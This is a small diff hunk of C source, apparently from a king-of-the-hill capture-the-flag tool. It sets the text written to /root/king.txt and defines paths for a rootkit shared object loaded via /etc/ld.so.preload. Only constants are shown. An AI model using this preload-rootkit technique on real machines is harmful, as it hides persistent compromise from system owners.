@@ -14,7 +14,7 @@
 #define KG_PATH "/root/king.txt"
 #define RK_PATH "/etc/ld.so.preload"
 #define RK_TEXT "/usr/local/lib/rootkit.so"
-#define KG_TEXT ""
+#define KG_TEXT "profxadke\n\0"
 
 
 int randint(int min, int max) {
